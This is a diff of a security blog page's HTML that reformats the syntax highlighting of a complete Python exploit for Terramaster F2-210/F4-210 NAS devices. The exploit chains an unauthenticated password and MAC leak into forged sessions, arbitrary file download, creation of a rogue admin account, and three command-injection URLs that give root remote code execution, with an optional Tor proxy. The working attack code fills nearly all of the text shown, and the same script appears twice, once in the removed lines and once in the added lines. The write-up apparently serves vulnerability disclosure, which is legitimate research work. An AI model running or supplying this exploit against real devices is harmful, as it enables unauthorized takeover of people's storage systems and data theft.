@@ -487,119 +487,119 @@ So we can call the <code>fileDownload</code> API then:</p>
 <li>Pick one of the 3 RCEs and pwn the NAS.</li>
 </ol>
 <p>Finally, here is the exploit:</p>
-<pre tabindex="0"><code>#/bin/env python
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#999;font-style:italic">#/bin/env python</span>
 
-&quot;&quot;&quot;
-Product: Terramaster F4-210, Terramaster F2-210
-Version: TOS 4.2.X (4.2.15-2107141517)
-Author: n0tme (thatsn0tmysite)
-Description: Chain from unauthenticated to root via session crafting.
-&quot;&quot;&quot;
+<span style="color:#ed9d13">&#34;&#34;&#34;
+</span><span style="color:#ed9d13">Product: Terramaster F4-210, Terramaster F2-210
+</span><span style="color:#ed9d13">Version: TOS 4.2.X (4.2.15-2107141517)
+</span><span style="color:#ed9d13">Author: n0tme (thatsn0tmysite)
+</span><span style="color:#ed9d13">Description: Chain from unauthenticated to root via session crafting.
+</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>
 
-import urllib3
-import requests
-import json
-import argparse
-import hashlib
-import time
-import os
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">urllib3</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">json</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">argparse</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">hashlib</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">time</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>
 
-TARGET = None 
-MAC_ADDRESS = None
-PWD = None
-TIMESTAMP = None 
+TARGET = <span style="color:#6ab825;font-weight:bold">None</span> 
+MAC_ADDRESS = <span style="color:#6ab825;font-weight:bold">None</span>
+PWD = <span style="color:#6ab825;font-weight:bold">None</span>
+TIMESTAMP = <span style="color:#6ab825;font-weight:bold">None</span> 
 
-def tos_encrypt_str(toencrypt):
-    key = MAC_ADDRESS[6:] 
-    return hashlib.md5(f&quot;{key}{toencrypt}&quot;.encode(&quot;utf8&quot;)).hexdigest()
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">tos_encrypt_str</span>(toencrypt):
+    key = MAC_ADDRESS[<span style="color:#3677a9">6</span>:] 
+    <span style="color:#6ab825;font-weight:bold">return</span> hashlib.md5(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>key<span style="color:#ed9d13">}{</span>toencrypt<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)).hexdigest()
 
-def user_session(session, username):
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">user_session</span>(session, username):
     session.cookies.clear()
-    cookies = {&quot;kod_name&quot;:username, &quot;kod_token&quot;:tos_encrypt_str(PWD)}
-    if username == &quot;guest&quot;:
-        cookies = {&quot;kod_name&quot;:&quot;guest&quot;, &quot;kod_token&quot;:tos_encrypt_str(&quot;&quot;)}
+    cookies = {<span style="color:#ed9d13">&#34;kod_name&#34;</span>:username, <span style="color:#ed9d13">&#34;kod_token&#34;</span>:tos_encrypt_str(PWD)}
+    <span style="color:#6ab825;font-weight:bold">if</span> username == <span style="color:#ed9d13">&#34;guest&#34;</span>:
+        cookies = {<span style="color:#ed9d13">&#34;kod_name&#34;</span>:<span style="color:#ed9d13">&#34;guest&#34;</span>, <span style="color:#ed9d13">&#34;kod_token&#34;</span>:tos_encrypt_str(<span style="color:#ed9d13">&#34;&#34;</span>)}
     
-    for name,value in cookies.items():
+    <span style="color:#6ab825;font-weight:bold">for</span> name,value <span style="color:#6ab825;font-weight:bold">in</span> cookies.items():
         session.cookies[name] = value
 
-def download(session, path, save_as=None):
-    user_session(session, &quot;guest&quot;)
-    r=session.post(f&quot;{TARGET}/module/api.php?mobile/fileDownload&quot;, data={&quot;path&quot;:path})
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">download</span>(session, path, save_as=<span style="color:#6ab825;font-weight:bold">None</span>):
+    user_session(session, <span style="color:#ed9d13">&#34;guest&#34;</span>)
+    r=session.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/fileDownload&#34;</span>, data={<span style="color:#ed9d13">&#34;path&#34;</span>:path})
     filename = os.path.basename(path)
-    if save_as is not None:
+    <span style="color:#6ab825;font-weight:bold">if</span> save_as <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">not</span> <span style="color:#6ab825;font-weight:bold">None</span>:
         filename = save_as
-    with open(filename, &quot;wb&quot;) as file:
+    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(filename, <span style="color:#ed9d13">&#34;wb&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> file:
         file.write(r.content)
 
-def get_admin_users(session):
-    download(session, &quot;/etc/group&quot;, save_as=&quot;/tmp/terramaster_group&quot;)
-    with open(&quot;/tmp/terramaster_group&quot;, &quot;r&quot;) as groups:
-        for line in groups:
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_admin_users</span>(session):
+    download(session, <span style="color:#ed9d13">&#34;/etc/group&#34;</span>, save_as=<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>, <span style="color:#ed9d13">&#34;r&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> groups:
+        <span style="color:#6ab825;font-weight:bold">for</span> line <span style="color:#6ab825;font-weight:bold">in</span> groups:
             line = line.strip()
-            fields = line.split(':')
-            if fields[0] == &quot;admin&quot;:
-                users = fields[3].split(&quot;,&quot;)
-                os.remove(&quot;/tmp/terramaster_group&quot;)
-                return users  
+            fields = line.split(<span style="color:#ed9d13">&#39;:&#39;</span>)
+            <span style="color:#6ab825;font-weight:bold">if</span> fields[<span style="color:#3677a9">0</span>] == <span style="color:#ed9d13">&#34;admin&#34;</span>:
+                users = fields[<span style="color:#3677a9">3</span>].split(<span style="color:#ed9d13">&#34;,&#34;</span>)
+                os.remove(<span style="color:#ed9d13">&#34;/tmp/terramaster_group&#34;</span>)
+                <span style="color:#6ab825;font-weight:bold">return</span> users  
 
-if __name__ == '__main__':
+<span style="color:#6ab825;font-weight:bold">if</span> __name__ == <span style="color:#ed9d13">&#39;__main__&#39;</span>:
     p = argparse.ArgumentParser()
-    p.add_argument(dest=&quot;target&quot;, help=&quot;Target URL (e.g. http://10.0.0.100:8181)&quot;)
-    p.add_argument(&quot;--cmd&quot;, dest=&quot;cmd&quot;, help=&quot;Command to run&quot;, default=&quot;id&quot;)
-    p.add_argument(&quot;-d&quot;, &quot;--download&quot;, dest=&quot;download&quot;, help=&quot;Only download file&quot;, default=None)
-    p.add_argument(&quot;-o&quot;, &quot;--output&quot;, dest=&quot;save_as&quot;, help=&quot;Save downloaded file as&quot;, default=None)
-    p.add_argument(&quot;-c&quot;, &quot;--create&quot;, dest=&quot;create&quot;, help=&quot;Only create admin user (format should be admin:password)&quot;, default=None)
-    p.add_argument(&quot;--tor&quot;, dest=&quot;tor&quot;, default=False, action=&quot;store_true&quot;, help=&quot;Use TOR&quot;)
-    p.add_argument(&quot;--rce&quot;, dest=&quot;rce&quot;, default=0, type=int, help=&quot;RCE to use (1 and 2 have no output)&quot;)
+    p.add_argument(dest=<span style="color:#ed9d13">&#34;target&#34;</span>, help=<span style="color:#ed9d13">&#34;Target URL (e.g. http://10.0.0.100:8181)&#34;</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;--cmd&#34;</span>, dest=<span style="color:#ed9d13">&#34;cmd&#34;</span>, help=<span style="color:#ed9d13">&#34;Command to run&#34;</span>, default=<span style="color:#ed9d13">&#34;id&#34;</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;-d&#34;</span>, <span style="color:#ed9d13">&#34;--download&#34;</span>, dest=<span style="color:#ed9d13">&#34;download&#34;</span>, help=<span style="color:#ed9d13">&#34;Only download file&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;-o&#34;</span>, <span style="color:#ed9d13">&#34;--output&#34;</span>, dest=<span style="color:#ed9d13">&#34;save_as&#34;</span>, help=<span style="color:#ed9d13">&#34;Save downloaded file as&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;-c&#34;</span>, <span style="color:#ed9d13">&#34;--create&#34;</span>, dest=<span style="color:#ed9d13">&#34;create&#34;</span>, help=<span style="color:#ed9d13">&#34;Only create admin user (format should be admin:password)&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;--tor&#34;</span>, dest=<span style="color:#ed9d13">&#34;tor&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">False</span>, action=<span style="color:#ed9d13">&#34;store_true&#34;</span>, help=<span style="color:#ed9d13">&#34;Use TOR&#34;</span>)
+    p.add_argument(<span style="color:#ed9d13">&#34;--rce&#34;</span>, dest=<span style="color:#ed9d13">&#34;rce&#34;</span>, default=<span style="color:#3677a9">0</span>, <span style="color:#24909d">type</span>=<span style="color:#24909d">int</span>, help=<span style="color:#ed9d13">&#34;RCE to use (1 and 2 have no output)&#34;</span>)
     args = p.parse_args()
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     TARGET = args.target 
 
     s = requests.Session()
-    if args.tor:
-        s.proxies = {&quot;http&quot;:&quot;socks5://127.0.0.1:9050&quot;, &quot;https&quot;: &quot;socks5://127.0.0.1:9050&quot;}
-    s.headers.update({&quot;user-device&quot;:&quot;TNAS&quot;, &quot;user-agent&quot;:&quot;TNAS&quot;})
+    <span style="color:#6ab825;font-weight:bold">if</span> args.tor:
+        s.proxies = {<span style="color:#ed9d13">&#34;http&#34;</span>:<span style="color:#ed9d13">&#34;socks5://127.0.0.1:9050&#34;</span>, <span style="color:#ed9d13">&#34;https&#34;</span>: <span style="color:#ed9d13">&#34;socks5://127.0.0.1:9050&#34;</span>}
+    s.headers.update({<span style="color:#ed9d13">&#34;user-device&#34;</span>:<span style="color:#ed9d13">&#34;TNAS&#34;</span>, <span style="color:#ed9d13">&#34;user-agent&#34;</span>:<span style="color:#ed9d13">&#34;TNAS&#34;</span>})
     
-    r=s.post(f&quot;{TARGET}/module/api.php?mobile/wapNasIPS&quot;)
-    try:
+    r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/wapNasIPS&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">try</span>:
         j = r.json()
-        PWD = j[&quot;data&quot;][&quot;PWD&quot;]
-        MAC_ADDRESS = j[&quot;data&quot;][&quot;ADDR&quot;]
-    except KeyError:
-        exit(1)
+        PWD = j[<span style="color:#ed9d13">&#34;data&#34;</span>][<span style="color:#ed9d13">&#34;PWD&#34;</span>]
+        MAC_ADDRESS = j[<span style="color:#ed9d13">&#34;data&#34;</span>][<span style="color:#ed9d13">&#34;ADDR&#34;</span>]
+    <span style="color:#6ab825;font-weight:bold">except</span> <span style="color:#bbb">KeyError</span>:
+        exit(<span style="color:#3677a9">1</span>)
     
-    TIMESTAMP = str(int(time.time()))
-    s.headers.update({&quot;signature&quot;: tos_encrypt_str(TIMESTAMP), &quot;timestamp&quot;: TIMESTAMP})
-    s.headers.update({&quot;authorization&quot;: PWD})
+    TIMESTAMP = <span style="color:#24909d">str</span>(<span style="color:#24909d">int</span>(time.time()))
+    s.headers.update({<span style="color:#ed9d13">&#34;signature&#34;</span>: tos_encrypt_str(TIMESTAMP), <span style="color:#ed9d13">&#34;timestamp&#34;</span>: TIMESTAMP})
+    s.headers.update({<span style="color:#ed9d13">&#34;authorization&#34;</span>: PWD})
 
-    if args.download != None:
+    <span style="color:#6ab825;font-weight:bold">if</span> args.download != <span style="color:#6ab825;font-weight:bold">None</span>:
         download(s, args.download, save_as=args.save_as)
-        exit(0)
+        exit(<span style="color:#3677a9">0</span>)
 
-    #RCEs
-    RCEs=[f&quot;{TARGET}/tos/index.php?app/del&amp;id=0&amp;name=;{args.cmd};xx%23&quot;,
-          f&quot;{TARGET}/tos/index.php?app/hand_app&amp;name=;{args.cmd};xx.tpk&quot;, #BLIND
-          f&quot;{TARGET}/tos/index.php?app/app_start_stop&amp;id=ups&amp;start=0&amp;name=donotcare.*.oexe;{args.cmd};xx&quot;] #BLIND
+    <span style="color:#999;font-style:italic">#RCEs</span>
+    RCEs=[<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/del&amp;id=0&amp;name=;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx%23&#34;</span>,
+          <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/hand_app&amp;name=;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx.tpk&#34;</span>, <span style="color:#999;font-style:italic">#BLIND</span>
+          <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?app/app_start_stop&amp;id=ups&amp;start=0&amp;name=donotcare.*.oexe;</span><span style="color:#ed9d13">{</span>args.cmd<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;xx&#34;</span>] <span style="color:#999;font-style:italic">#BLIND</span>
     
-    for admin in get_admin_users(s):
+    <span style="color:#6ab825;font-weight:bold">for</span> admin <span style="color:#6ab825;font-weight:bold">in</span> get_admin_users(s):
         user_session(s, admin)
-        if args.create != None:
-            user, password = args.create.split(&quot;:&quot;) 
-            groups = json.dumps([&quot;allusers&quot;, &quot;admin&quot;])
-            r=s.post(f&quot;{TARGET}/module/api.php?mobile/__construct&quot;)
-            r=s.post(f&quot;{TARGET}/module/api.php?mobile/set_user_information&quot;, data={&quot;groups&quot;:groups, &quot;username&quot;:user,&quot;operation&quot;:&quot;0&quot;,&quot;password&quot;:password,&quot;capacity&quot;:&quot;&quot;})
-            if &quot;create user successful!&quot; in str(r.content, &quot;utf8&quot;):
-                print(r.content)
-                break
-            continue
+        <span style="color:#6ab825;font-weight:bold">if</span> args.create != <span style="color:#6ab825;font-weight:bold">None</span>:
+            user, password = args.create.split(<span style="color:#ed9d13">&#34;:&#34;</span>) 
+            groups = json.dumps([<span style="color:#ed9d13">&#34;allusers&#34;</span>, <span style="color:#ed9d13">&#34;admin&#34;</span>])
+            r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/__construct&#34;</span>)
+            r=s.post(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/set_user_information&#34;</span>, data={<span style="color:#ed9d13">&#34;groups&#34;</span>:groups, <span style="color:#ed9d13">&#34;username&#34;</span>:user,<span style="color:#ed9d13">&#34;operation&#34;</span>:<span style="color:#ed9d13">&#34;0&#34;</span>,<span style="color:#ed9d13">&#34;password&#34;</span>:password,<span style="color:#ed9d13">&#34;capacity&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>})
+            <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#34;create user successful!&#34;</span> <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">str</span>(r.content, <span style="color:#ed9d13">&#34;utf8&#34;</span>):
+                <span style="color:#24909d">print</span>(r.content)
+                <span style="color:#6ab825;font-weight:bold">break</span>
+            <span style="color:#6ab825;font-weight:bold">continue</span>
 
         r = s.get(RCEs[args.rce])
-        content = str(r.content, &quot;utf-8&quot;)
-        if &quot;&lt;!--user login--&gt;&quot; not in content: 
-            print(content)
-    exit(0)
-</code></pre><h2 id="fix-it">Fix it</h2>
+        content = <span style="color:#24909d">str</span>(r.content, <span style="color:#ed9d13">&#34;utf-8&#34;</span>)
+        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#34;&lt;!--user login--&gt;&#34;</span> <span style="color:#6ab825;font-weight:bold">not</span> <span style="color:#6ab825;font-weight:bold">in</span> content: 
+            <span style="color:#24909d">print</span>(content)
+    exit(<span style="color:#3677a9">0</span>)
+</code></pre></div><h2 id="fix-it">Fix it</h2>
 <p>This should be handled by Terramaster, not yourself, but in case you do not want to wait for them to release a patch.
 Here are a few workarounds, those are to be considered as complementary to each others:</p>
 <ul>
